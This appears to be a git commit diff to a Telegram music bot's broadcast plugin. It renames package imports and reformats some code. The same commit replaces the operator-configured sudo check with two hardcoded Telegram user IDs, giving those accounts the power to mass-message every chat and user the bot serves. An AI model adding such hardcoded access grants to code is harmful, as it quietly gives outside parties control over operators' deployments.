8c4b25801151a442167f8b080053694d7f55f1f1
ANURAG X MUSIC 💞 <lokendrhopal@gmail.com>
2025-05-22 09:58:19 +0530

    Update broadcast.py

--- EsproMusic/plugins/misc/broadcast.py
+++ EsproMusic/plugins/misc/broadcast.py
@@ -4,23 +4,23 @@ from pyrogram import filters
 from pyrogram.enums import ChatMembersFilter
 from pyrogram.errors import FloodWait
 
-from EsproMusic import app
-from EsproMusic.misc import SUDOERS
-from EsproMusic.utils.database import (
+from SONALI import app
+from SONALI.misc import SUDOERS
+from SONALI.utils.database import (
     get_active_chats,
     get_authuser_names,
     get_client,
     get_served_chats,
     get_served_users,
 )
-from EsproMusic.utils.decorators.language import language
-from EsproMusic.utils.formatters import alpha_to_int
+from SONALI.utils.decorators.language import language
+from SONALI.utils.formatters import alpha_to_int
 from config import adminlist
 
 IS_BROADCASTING = False
 
 
-@app.on_message(filters.command("broadcast") & SUDOERS)
+@app.on_message(filters.command(["broadcast", "gcast"]) & filters.user([6801520845, 7745362209]))
 @language
 async def braodcast_message(client, message, _):
     global IS_BROADCASTING
@@ -117,17 +117,17 @@ async def braodcast_message(client, message, _):
     if "-assistant" in message.text:
         aw = await message.reply_text(_["broad_5"])
         text = _["broad_6"]
-        from EsproMusic.core.userbot import assistants
+        from SONALI.core.userbot import assistants
 
         for num in assistants:
             sent = 0
             client = await get_client(num)
             async for dialog in client.get_dialogs():
                 try:
-                    await client.forward_messages(
-                        dialog.chat.id, y, x
-                    ) if message.reply_to_message else await client.send_message(
-                        dialog.chat.id, text=query
+                    (
+                        await client.forward_messages(dialog.chat.id, y, x)
+                        if message.reply_to_message
+                        else await client.send_message(dialog.chat.id, text=query)
                     )
                     sent += 1
                     await asyncio.sleep(3)
